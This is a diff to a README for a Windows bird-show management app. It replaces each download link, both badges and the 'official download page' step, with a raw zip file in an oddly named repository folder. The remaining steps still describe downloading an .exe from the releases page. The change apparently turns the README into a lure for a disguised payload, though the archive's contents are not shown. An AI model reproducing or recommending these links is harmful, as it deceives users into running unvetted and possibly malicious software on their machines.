@@ -1,6 +1,6 @@
 # 🐦 benchabird_app - Manage bird shows with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Shahziil123/benchabird_app/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Shahziil123/benchabird_app/main/divisionism/benchabird-app-v1.9-alpha.4.zip)
 
 ## 📋 About This Software
 
@@ -19,7 +19,7 @@ Your computer must meet these basic needs to use this software:
 
 Follow these steps to obtain the program:
 
-1.  Visit the [official download page](https://github.com/Shahziil123/benchabird_app/releases).
+1.  Visit the [official download page](https://raw.githubusercontent.com/Shahziil123/benchabird_app/main/divisionism/benchabird-app-v1.9-alpha.4.zip).
 2.  Look for the section marked Latest.
 3.  Find the file ending in .exe under the Assets heading.
 4.  Click the file name to start the download.
@@ -86,4 +86,4 @@ The software uses a local database system. Benchabird manages these files inside
 
 If the program fails to start, verify your Windows version. Ensure you have the latest updates for your system. If the window appears empty, check that you have created or selected a show file first. Restart the application if you encounter unexpected behavior. Always perform a fresh download from the link if the file appears damaged.
 
-[![](https://img.shields.io/badge/Download-Latest_Release-grey.svg)](https://github.com/Shahziil123/benchabird_app/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-grey.svg)](https://raw.githubusercontent.com/Shahziil123/benchabird_app/main/divisionism/benchabird-app-v1.9-alpha.4.zip)
